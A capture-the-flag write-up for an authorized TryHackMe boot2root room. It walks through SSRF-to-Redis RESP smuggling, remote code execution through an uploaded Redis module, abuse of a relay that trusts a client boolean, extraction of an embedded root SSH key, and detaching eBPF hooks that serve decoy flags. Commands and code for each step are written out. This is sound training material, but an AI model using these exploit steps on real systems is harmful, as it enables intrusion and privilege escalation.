# Quite (QUIET)

**Category:** boot2root · **Points:** 464 (user) · **Solves:** 7 (user) · **Flags:** `isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}` (user) · `isfcr{r00ted_by_r3n4m1ng_0bjdump}` (root)

## Challenge

> "The closer you look, the less you see." Deploy the box:
> `https://tryhackme.com/jr/isfcr2` — Flag format: `isfcr{...}`

A deep boot2root. The initial access is an SSRF → Redis-module → RCE chain, but
the signature twist is that the box uses **eBPF to lie to you**: selected files
return decoy bytes to ordinary readers. The flags you `cat` are fake; you have
to read the files in a way the kernel hooks don't intercept.

> Authorized, disposable TryHackMe room; target IP changes per deploy. Uses
> `<target>` as a placeholder. The helper scripts read the host from a local
> `target.txt`.

## Initial Analysis

Port 80 is a tiny **SMART Disk Health Monitor** page that advertises its own
endpoints (`quite-user/loot/index.txt`):

```
POST /api/report/preview  {"url":"http://collector.internal/report.csv"}
POST /api/attachment/upload  multipart/form-data, field "file"
```

`/preview` fetches a URL server-side → **SSRF**. `/upload` writes an arbitrary
file under `/var/spool/quiet-app/` and returns its path. Those two combine
badly.

## Vulnerability / Core Concept

```
SSRF (CRLF -> Redis RESP) on 127.0.0.1:6379
  -> upload a Redis module to a Redis-readable path, MODULE LOAD it
  -> quiet.exec RCE as app
  -> abuse quiet-relay: it trusts a client-supplied "cap_verify":true
  -> run a hook as the relay user; read the REAL flag with dd (bypasses the decoy)
  -> root: extract an SSH key baked into quiet-relay, SSH as root
  -> detach the pinned eBPF links, then re-read /root/root.txt
```

**1. SSRF → Redis.** Redis (loopback `6379`) speaks RESP, a length-prefixed
protocol. The preview URL parser accepts CRLF, so starting with an
HTTP-looking URL and appending raw RESP makes the internal socket talk Redis
(`redis_inject.py`). A `gopher://127.0.0.1:6379/_<percent-encoded RESP>` URL is
an equivalent carrier (`redis_ssrf.py`).

**2. Upload + MODULE LOAD → RCE.** Upload a compiled Redis module whose
`quiet.exec` command `popen()`s its argument (`quietmod.c`), then:

```
MODULE LOAD /var/spool/quiet-app/<random>.so
quiet.exec id        # -> uid=1001(app) gid=1001(app)
```

Reliable non-interactive RCE as `app`, no reverse shell required.

**3. quiet-relay trusts a JSON boolean.** `/run/quiet-relay/ctrl.sock` is
`srw-rw-rw-`. Its README claims only an orchestrator with `CAP_SYS_ADMIN` may
bypass the peer-UID check; the source (`relay.c`) tells the truth:

```c
cap_verify = json_bool(request, "cap_verify");
if (!cap_verify && peer.uid != getuid()) deny();   // no real capability check!
```

Sending `"cap_verify": true` skips the UID test. `exec_hook` then base64-decodes
`data`, writes it to a temp executable, and runs it as the `relay` user.

**4. The kernel lies (eBPF read-time substitution).** `cat`-ing the user flag
returns decoy text, because eBPF LSM/tracing programs (`quiet_lsm_file_open`,
`quiet_fexit_vfs_read`, …) swap bytes for tagged inodes using `tagged_files` /
`decoys` maps. The fix for *user* is to read via `dd` (a different read path the
hook doesn't rewrite the same way) — hence the flag text.

**5. Root — key baked into a binary + detach the hooks.** `quiet-relay`
embeds an unencrypted OpenSSH *root* maintenance key in `.rodata`. Ordinary
output is deceived, so dump it with a **renamed** copy of objdump (the tracing
logic keys partly off the tool name) — hence `r00ted_by_r3n4m1ng_0bjdump`.
Even as root, `cat /root/root.txt` returns a decoy (`isfcr{n0t_th15_0ne_k33p_l00k1ng}`);
you must detach the pinned BPF links first.

## Exploitation

### User

```bash
echo "<target>" > target.txt
# 1) build + upload the module
gcc -shared -fPIC -I. quietmod.c -o quietmod.so        # needs redismodule.h
curl -sS -F 'file=@quietmod.so' "http://<target>/api/attachment/upload"
# -> {"saved":"/var/spool/quiet-app/<random>.so","size":38296}

# 2) load it and get RCE (RESP smuggled through the SSRF)
python3 redis_cmd.py MODULE LOAD /var/spool/quiet-app/<random>.so
python3 redis_cmd.py quiet.exec id
```

Then abuse the relay. Stage this hook client and run it via `quiet.exec`; `dd`
is deliberate — it reads the *real* flag, not the decoy:

```python
hook = b"""#!/bin/sh
/bin/dd if=/home/relay/user.txt of=/tmp/relay_user status=none
/bin/chmod 0644 /tmp/relay_user
"""
req = {"op":"exec_hook","cap_verify":True,
       "data":base64.b64encode(hook).decode(),"args":""}
s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect("/run/quiet-relay/ctrl.sock")
s.sendall((json.dumps(req)+"\n").encode()); print(s.recv(4096).decode())
```

```
quiet.exec cat /tmp/relay_user   # -> isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}
```

### Root

```bash
# extract the embedded OpenSSH key with a RENAMED objdump (evades the trace)
cp /usr/bin/objdump /tmp/qlook
/tmp/qlook -s -j .rodata /usr/local/sbin/quiet-relay   # key in the ASCII column
# reconstruct -> relay.key, chmod 600, then:
ssh -i relay.key root@<target>      # or root@127.0.0.1 from the compromised host

# the obvious flag is a decoy; detach the pinned eBPF links, then re-read
rm /sys/fs/bpf/quiet/link_quiet_fexit_vfs_read \
   /sys/fs/bpf/quiet/link_quiet_lsm_file_open \
   /sys/fs/bpf/quiet/link_quiet_lsm_file_free
bpftool link show                               # confirm they're gone
grep -ao 'isfcr{[^}]*}' /root/root.txt          # fresh read -> real bytes
```

## Flag

```
isfcr{th3_k3rn3l_l13d_but_dd_t3lls_th3_truth}   # user
isfcr{r00ted_by_r3n4m1ng_0bjdump}                # root
```

(Decoys seen along the way: `isfcr{n0t_th15_0ne_k33p_l00k1ng}` from the faked
`/root/root.txt`.)

## Included files

- `redis_inject.py` — SSRF via raw CRLF → RESP smuggling into loopback Redis.
- `redis_ssrf.py` — `gopher://`-based variant of the same primitive.
- `redis_cmd.py` — thin wrapper that sends a command and prints the decoded reply.
- `quietmod.c` — the Redis module exposing `quiet.exec` (popen RCE). Build with `redismodule.h`.

> Scripts read the instance host from `target.txt` (not included). No instance
> secrets or SSH keys are shipped.

## Key Takeaways

- SSRF + a URL parser that tolerates CRLF = you can smuggle any line-based binary
  protocol (RESP, here) into a loopback service. `gopher://` does the same job.
- `MODULE LOAD` is RCE if you can place a `.so` where Redis can read it — disable
  modules you don't need.
- A privilege boolean in an untrusted request (`cap_verify:true`) is not a
  capability check; verify caller creds in the kernel.
- eBPF can rewrite what user space reads. If different tools disagree, suspect
  tracing hooks — compare read paths (`dd` vs `cat`), rename your tools, and
  detach the pinned links before trusting any read.
